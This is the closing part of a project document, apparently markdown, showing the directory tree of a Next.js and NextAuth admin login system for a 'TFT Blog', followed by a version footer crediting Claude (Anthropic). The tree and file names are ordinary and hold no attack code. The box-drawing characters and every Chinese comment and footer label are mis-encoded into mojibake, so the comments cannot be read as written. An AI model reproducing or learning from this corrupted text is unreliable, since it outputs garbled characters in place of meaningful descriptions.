â”‚   â””â”€â”€ Admin.ts                     # ç®¡ç†å‘˜æ¨¡å‹ï¼ˆå¯†ç å“ˆå¸Œï¼‰
â”‚
â”œâ”€â”€ types/
â”‚   â”œâ”€â”€ admin.ts                     # ç±»å‹å®šä¹‰
â”‚   â””â”€â”€ next-auth.d.ts               # NextAuth ç±»å‹æ‰©å±•
â”‚
â”œâ”€â”€ app/
â”‚   â”œâ”€â”€ api/
â”‚   â”‚   â””â”€â”€ auth/[...nextauth]/      # NextAuth API è·¯ç”±
â”‚   â”‚       â””â”€â”€ route.ts
â”‚   â”‚
â”‚   â”œâ”€â”€ login/
â”‚   â”‚   â””â”€â”€ page.tsx                 # ç™»å½•é¡µé¢ï¼ˆClient Componentï¼‰
â”‚   â”‚
â”‚   â”œâ”€â”€ dashboard/                   # å—ä¿æŠ¤è·¯ç”±
â”‚   â”‚   â”œâ”€â”€ layout.tsx               # æƒé™æ£€æŸ¥
â”‚   â”‚   â”œâ”€â”€ page.tsx                 # æ§åˆ¶å°é¦–é¡µ
â”‚   â”‚   â”œâ”€â”€ rss/
â”‚   â”‚   â”‚   â””â”€â”€ page.tsx             # RSS ç®¡ç†
â”‚   â”‚   â”œâ”€â”€ guides/
â”‚   â”‚   â”‚   â””â”€â”€ page.tsx             # æ”»ç•¥ç®¡ç†
â”‚   â”‚   â””â”€â”€ components/
â”‚   â”‚       â”œâ”€â”€ DashboardNav.tsx     # ä¾§è¾¹å¯¼èˆª
â”‚   â”‚       â””â”€â”€ LogoutButton.tsx     # ç™»å‡ºæŒ‰é’®ï¼ˆå·²å¼ƒç”¨ï¼‰
â”‚   â”‚
â”‚   â””â”€â”€ components/
â”‚       â”œâ”€â”€ Navbar.tsx               # å¯¼èˆªæ ï¼ˆæ˜¾ç¤ºç™»å½•çŠ¶æ€ï¼‰
â”‚       â””â”€â”€ Footer.tsx               # é¡µè„š
â”‚
â”œâ”€â”€ lib/
â”‚   â””â”€â”€ mongodb.ts                   # æ•°æ®åº“è¿æ¥
â”‚
â””â”€â”€ scripts/
    â”œâ”€â”€ create-admin.ts              # åˆ›å»ºç®¡ç†å‘˜è„šæœ¬ï¼ˆTypeScriptï¼‰
    â””â”€â”€ create-admin.js              # åˆ›å»ºç®¡ç†å‘˜è„šæœ¬ï¼ˆJavaScriptï¼‰
```

---

**æ–‡æ¡£ç‰ˆæœ¬**: v1.0
**æœ€åæ›´æ–°**: 2026-02-11
**ä½œè€…**: Claude (Anthropic)
**é¡¹ç›®**: TFT Blog ç®¡ç†å‘˜è®¤è¯ç³»ç»Ÿ
